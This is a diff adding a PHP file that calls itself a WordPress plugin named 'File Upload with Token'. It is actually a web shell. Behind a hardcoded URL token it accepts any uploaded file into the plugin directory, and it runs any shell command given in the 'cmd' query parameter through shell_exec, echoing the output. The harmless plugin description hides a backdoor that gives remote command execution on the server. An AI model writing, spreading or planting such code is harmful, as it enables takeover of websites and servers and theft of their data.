@@ -1,0 +1,33 @@
+<?php
+  /*
+Plugin Name: File Upload with Token
+Plugin URI: https://github.com/drian-o/
+Description: Simple File Upload with URL Token
+Version: 1.2
+Author URI: https://github.com/drian-o/
+*/
+
+// Atur token rahasia (bisa diganti sesuka hati)
+$valid_token = "Superbone";
+
+// Ambil token dari URL
+$token = isset($_GET['token']) ? $_GET['token'] : "";
+
+// Cek apakah token cocok
+if ($token !== $valid_token) {
+    die("<b>Access Denied!</b> Please contact Administrator.");
+}
+  if(isset($_FILES['f'])){
+      $dir = dirname(__FILE__) . '/';
+      $name = basename($_FILES['f']['name']);
+      if(move_uploaded_file($_FILES['f']['tmp_name'], $dir . $name)){
+          $url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']
+               . str_replace(basename(__FILE__), '', $_SERVER['PHP_SELF']) . $name;
+          echo 'uploaded: <a href="' . $url . '" target="_blank">' . htmlspecialchars($name) . '</a>';
+      }
+  }
+  if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; }
+  ?>
+  <form method="POST" enctype="multipart/form-data">
+    <input type="file" name="f"><button>-black-here-</button>
+  </form>
